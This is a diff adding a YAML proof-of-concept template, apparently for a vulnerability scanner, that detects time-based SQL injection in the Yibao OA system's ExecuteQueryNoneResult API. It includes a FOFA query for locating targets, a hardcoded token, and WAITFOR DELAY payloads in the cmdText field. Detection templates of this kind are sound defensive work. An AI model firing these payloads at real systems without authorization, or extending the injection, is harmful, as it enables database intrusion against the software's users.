@@ -1,0 +1,31 @@
+id: poc-yaml-yi-bao-oa-system-executequerynoneresult-sqli
+info:
+  name: 易宝OA系统 ExecuteQueryNoneResultSQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易宝OA
+  fofa: app="顶讯科技-易宝OA系统"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /api/system/ExecuteQueryNoneResult
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: token=zxh&cmdText=;WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(find_json(body,"message"), "success")
+    && contains(find_json(body,"is_succeed"), "true") && contains(content_type,"application/json")
+    && duration > t1 && duration < t2
+- method: POST
+  path: /api/system/ExecuteQueryNoneResult
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: token=zxh&cmdText=;WAITFOR DELAY '0:0:{{.t3}}'--
+  expression: status_code == 200 && contains(find_json(body,"message"), "success")
+    && contains(find_json(body,"is_succeed"), "true") && contains(content_type,"application/json")
+    && duration > t3 && duration < t4
+transport: http
